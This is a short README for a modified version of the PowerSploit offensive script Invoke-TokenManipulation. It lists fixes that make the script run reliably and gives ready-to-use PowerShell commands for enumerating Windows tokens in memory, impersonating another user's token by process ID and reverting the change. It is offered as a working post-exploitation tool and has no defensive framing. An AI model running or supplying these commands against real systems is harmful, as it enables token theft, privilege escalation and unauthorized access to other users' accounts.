# Invoke-TokenManipulation
## Foreword
Heavily inspired by
- https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1
- https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/

I changed some lines, as the original kept crashing my powershell session because one Buffer was too small. However, this script should work.
## Changes
```
Before: [UInt32]$PrivilegeNameSize = 60
After:  [UInt32]$PrivilegeNameSize = 100


Before:  $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress') 
After:   $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);
```


## Examples
Load into current process
```
. .\Invoke-TokenManipulation.ps1
```

List Tokens in Memory
```
# All tokens that may be used for network authentication
Invoke-TokenManipulation -Enumerate

# All tokens
Invoke-TokenManipulation -ShowAll
```

Impersonate User of ProcessID
```
Invoke-TokenManipulation -ImpersonateUser -ProcessId 1376 -Username "DOMAIN\USERNAME"
Invoke-TokenManipulation -ImpersonateUser -ProcessId 1376
```

Show current Token of current Process
```
Invoke-TokenManipulation -WhoAmI
```


Revert Token Change in current Process
```
Invoke-TokenManipulation -RevToSelf
```

